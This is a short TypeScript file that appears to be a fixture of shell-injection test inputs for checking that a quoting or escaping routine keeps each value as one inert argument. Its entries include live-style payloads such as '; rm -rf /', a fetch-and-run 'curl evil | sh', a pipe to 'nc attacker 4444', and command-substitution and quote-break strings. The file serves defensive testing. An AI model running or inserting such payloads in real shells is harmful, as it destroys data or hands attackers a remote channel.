export interface ShellVector {
  input: string;
  rationale: string;
}

export const SHELL_INJECTION_VECTORS: readonly ShellVector[] = [
  { input: `; rm -rf /`, rationale: 'command chaining via semicolon' },
  { input: `&& curl evil | sh`, rationale: 'command chaining via &&' },
  { input: `| nc attacker 4444`, rationale: 'pipe to attacker-controlled process' },
  { input: `$(whoami)`, rationale: 'POSIX command substitution' },
  { input: '`id`', rationale: 'legacy backtick command substitution' },
  { input: `$USER`, rationale: 'variable expansion' },
  { input: `~/secrets`, rationale: 'tilde expansion to home dir' },
  { input: `*`, rationale: 'pathname glob expansion' },
  { input: `'; echo pwned; '`, rationale: 'quote-break + command injection' },
  { input: `arg with spaces`, rationale: 'whitespace argv splitting' },
  { input: `newline\nsecond`, rationale: 'newline as argument separator' },
  { input: `--flag=val`, rationale: 'flag smuggling — must stay one token, not two' },
  { input: `-rf`, rationale: 'flag-lookalike value that must not be interpreted as a flag' },
] as const;
